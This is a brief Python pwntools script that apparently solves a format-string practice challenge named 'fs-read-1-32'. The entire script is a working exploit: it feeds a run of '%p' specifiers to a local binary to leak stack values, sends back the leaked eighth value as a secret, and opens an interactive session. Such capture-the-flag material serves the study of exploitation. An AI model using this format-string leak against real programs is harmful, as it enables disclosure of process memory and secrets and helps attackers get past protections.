#!/usr/bin/env python

from pwn import *
import os

p = process('./fs-read-1-32')
print(p.recvline())
p.sendline(' %p %p %p %p %p %p %p %p %p')
data=p.recvline()
print(data)
tosend=data.split(' ')[7]
print('test:')
print(tosend)
p.sendline(tosend)
p.recvline()
p.interactive()
